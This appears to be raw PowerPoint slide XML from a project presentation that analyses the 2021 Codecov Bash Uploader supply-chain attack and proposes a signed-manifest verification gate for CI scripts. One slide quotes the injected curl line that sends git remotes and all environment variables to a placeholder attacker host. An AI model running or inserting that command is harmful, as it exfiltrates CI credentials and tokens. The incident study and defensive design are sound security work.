                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Ed25519-signed canonical manifest</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> → customer </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>security gate</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> (CRL, admission policy, signature, hash, provenance) → </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DEPLOY or BLOCK</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>, logged in </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SQLite</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> and shown on a </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Flask dashboard</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Result: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>9/9</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> required tests pass, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>7/7</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> attacks blocked, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>0 %</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> false acceptance, ~1.89 ms per verification.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="1463040"/>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892040" y="1828800"/>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1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TextBox 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="1554480"/>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Analyse</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="1874520"/>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the documented Codecov incident: vector, timeline, violated requirements</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rounded Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="2679192"/>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892040" y="3044952"/>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2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="2770632"/>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Design</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="3090672"/>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a supply chain where customers verify integrity AND authenticity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rounded Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="3895344"/>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2040" y="4261104"/>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3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="3986783"/>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Implement</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="TextBox 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="4306824"/>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build, sign, key/CRL management, verifier, CI gate, audit, dashboard</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Rounded Rectangle 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="5111496"/>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92040" y="5477256"/>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4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="5202936"/>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Validate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="5522976"/>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9 required test cases, attack simulations, FAR and latency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The Codecov Incident (2021)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="365760" y="1417320"/>
          <a:ext cx="5577839" cy="4096512"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="0" bandRow="0"/>
              <a:tblGrid>
                <a:gridCol w="1600200"/>
                <a:gridCol w="3977639"/>
              </a:tblGrid>
              <a:tr h="512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Attribute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00" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Documented facts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512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Organisation / sector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Codecov: code-coverage SaaS (DevOps tooling)</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512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Component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Bash Uploader (also used by GitHub Action, CircleCI Orb, Bitrise Step)</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512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Compromise began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31 January 2021 (periodic alterations)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512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Detected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1 April 2021: customer saw checksum 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512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Disclosed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15 April 2021</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512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Initial access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Docker image build error exposed an HMAC key for a GCS service account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512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Impact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CI env. variables (tokens, keys) + git remotes sent to attacker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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rounded Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1417320"/>
            <a:ext cx="260604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72200" y="1527048"/>
            <a:ext cx="2606040" cy="729234"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="B42318"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>~2 months</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="2186330"/>
            <a:ext cx="2459736" cy="530352"/>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undetected in customers' CI</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2880360"/>
            <a:ext cx="260604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72200" y="2990088"/>
            <a:ext cx="2606040" cy="729234"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="B42318"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>1 line</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="3649370"/>
            <a:ext cx="2459736" cy="530352"/>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of injected code was enough</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rounded Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="4343400"/>
            <a:ext cx="260604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72200" y="4453128"/>
            <a:ext cx="2606040" cy="729234"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>HTTPS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="5112410"/>
            <a:ext cx="2459736" cy="530352"/>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did not help: file was on the genuine server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="5852160"/>
            <a:ext cx="8412480" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0" i="1">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Sources: Codecov security update [1]; Reuters [2]; HashiCorp HCSEC-2021-12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Attack Flow &amp; Problem Statement</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="codecov_attack.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1371600"/>
            <a:ext cx="8412480" cy="1605702"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rounded Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="3108960"/>
            <a:ext cx="8412480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF7F6"/>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3136392"/>
            <a:ext cx="8229600" cy="512064"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1050" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="B42318"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>curl -sm 0.5 -d "$(git remote -v)&lt;&lt;&lt;&lt;&lt;&lt; ENV $(env)" http://&lt;attacker-ip&gt;/upload/v2 || true</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="3840480"/>
            <a:ext cx="4114800" cy="10972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5488" y="3886200"/>
            <a:ext cx="3931920" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1350" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Why HTTPS did not help</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TextBox 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="4206240"/>
            <a:ext cx="3931920" cy="73152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TLS protects bytes in transit and authenticates the server. The malicious file was ON the genuine server.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Rounded Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="3840480"/>
            <a:ext cx="4114800" cy="10972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73168" y="3886200"/>
            <a:ext cx="3931920" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1350" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Why the checksum did not help</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="4206240"/>
            <a:ext cx="3931920" cy="73152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A hash is not authentication. Checking was manual, and an unsigned checksum can be swapped with the file.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rounded Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="5120640"/>
            <a:ext cx="8412480" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E6EFFA"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="9DB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 y="5175504"/>
            <a:ext cx="8183879" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1350" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Problem statement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Before a vendor script runs in CI, automatically prove it is unmodified, signed by a trusted and non-revoked vendor key, allowed by policy (signer, version, source) and matches its provenance, even if the storage bucket is compromised.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Vulnerabilities &amp; Security Requirements</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1371600"/>
            <a:ext cx="1705356" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDECEA"/>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B42318"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Integrity (primary)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rounded Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2180844" y="1371600"/>
            <a:ext cx="1161288" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDECEA"/>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B42318"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Authenticity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3451860" y="1371600"/>
            <a:ext cx="1394460" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDECEA"/>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B42318"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Confidentiality</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4956048" y="1371600"/>
            <a:ext cx="1394460" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF4DE"/>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8A5A00"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Non-repudiation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6460236" y="1371600"/>
            <a:ext cx="1627632" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF4DE"/>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8A5A00"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Availability (2nd)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="10" name="Table 9"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="365760" y="1965960"/>
          <a:ext cx="8412480" cy="4224528"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="0" bandRow="0"/>
              <a:tblGrid>
                <a:gridCol w="2926080"/>
                <a:gridCol w="2560320"/>
                <a:gridCol w="2926080"/>
              </a:tblGrid>
              <a:tr h="603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1250" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Vulnerability (documented incident)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250" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Requirement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250" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
